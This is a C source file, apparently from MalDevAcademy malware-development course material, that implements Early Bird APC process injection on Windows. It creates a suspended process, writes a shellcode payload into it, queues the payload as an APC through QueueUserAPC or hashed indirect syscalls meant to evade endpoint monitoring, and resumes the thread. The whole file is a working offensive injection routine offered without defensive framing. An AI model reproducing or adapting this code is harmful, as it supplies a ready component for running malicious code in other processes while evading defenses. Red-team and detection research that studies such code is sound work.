// @NUL0x4C | @mrd0x : MalDevAcademy

#include "injection.h"
#include <stdio.h>

/*
Parameters:
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId;  Pointer to a DWORD which will recieve the newly created process's PID.
	- hProcess; Pointer to a HANDLE that will recieve the newly created process's handle.
	- hThread; Pointer to a HANDLE that will recieve the newly created process's thread.

Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
*/
BOOL CreateSuspendedProcess(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    WCHAR lpPath[MAX_PATH * 2];
    WCHAR WnDr[MAX_PATH];

    STARTUPINFOW Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Cleaning the structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    Si.cb = sizeof(STARTUPINFOW);

    // Creating the target process path
    wcscpy_s(lpPath, MAX_PATH * 2, lpProcessName);
    DebugPrint("\n\t[i] Running : \"%ls\" ...\n", lpPath);

    if (!CreateProcessW(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,  // alt: DEBUG_PROCESS
        NULL,
        NULL,
        &Si,
        &Pi)) {
        DebugPrint("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    DebugPrint("[+] DONE \n");

    // Populating the OUTPUT parameter with 'CreateProcessW's output'
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
	DWORD		dwProcessId		= 0;
	PVOID		pAddress		= NULL;
    NTSTATUS	STATUS          = 0;

//	creating target remote process (in debugged state)
	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);

#ifdef HW_INDIRECT_SYSCALL
    NTSTATUS status;
    PROCESS_INFORMATION pi;

    if (!CreateSuspendedProcessWithSyscall(szProcessName, &pi)) {
        DebugPrint("[!] Failed to create process using indirect syscall.\n");
        return FALSE;
    }

    dwProcessId = pi.dwProcessId;
    hProcess = pi.hProcess;
    hThread = pi.hThread;
#else
    if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread)) {
		return FALSE;
	}
#endif

	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
	DebugPrint("[+] DONE \n\n");


// injecting the payload and getting the base address of it
	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
	if (!payload_loading(&pAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
		return FALSE;
	}
	PrintMemoryBytes(hProcess, pAddress, 20);
	DebugPrint("[+] DONE \n\n");

//	running QueueUserAPC
#ifdef HW_INDIRECT_SYSCALL
    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    DebugPrint("[+] DONE \n");
#else
    QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
#endif

    DebugPrint("[i] Resuming The Suspended Thread ... ");
    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char*)("NtResumeThread"));
    ULONG suspendCount = 0;

#ifdef HW_INDIRECT_SYSCALL
    if ((STATUS = pNtResumeThread(hThread, &suspendCount)) != 0) {
        DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }
#else
    suspendCount = ResumeThread(hThread);
	if (suspendCount == (DWORD)-1) {
		DebugPrint("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
#endif
    DebugPrint("[+] Thread Resumed Successfully \n\n");

    // Optional: Wait for the injected code to execute
    Sleep(2000);
	DebugPrint("[+] DONE \n\n");

// Closing the handles to the process and thread
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return TRUE;
}